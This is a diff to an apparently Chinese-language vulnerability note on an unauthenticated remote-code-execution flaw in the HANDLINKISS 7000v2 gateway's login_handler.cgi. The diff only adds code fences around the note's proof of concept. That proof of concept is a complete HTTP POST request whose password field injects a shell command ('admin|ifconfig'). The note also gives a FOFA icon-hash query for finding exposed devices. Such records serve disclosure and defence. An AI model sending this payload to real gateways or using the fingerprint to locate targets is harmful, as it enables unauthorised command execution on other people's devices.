@@ -80,6 +80,7 @@ FOFA：icon_hash="-842942564"
 
 POC/EXP：
 
+```
 POST /login_handler.cgi HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
@@ -87,6 +88,8 @@ Content-Type: application/x-www-form-urlencoded
 Connection: close
 
 username=admin&password=admin|ifconfig&uilng=3&button=%E7%99%BB%E5%85%A5&Signin=
+```
+
 
 ![image-20241108105834446](./.resource/HANDLINKISS-7000v2网关login_handler.cgi未授权RCE漏洞/media/image-20241108105834446.png)
 
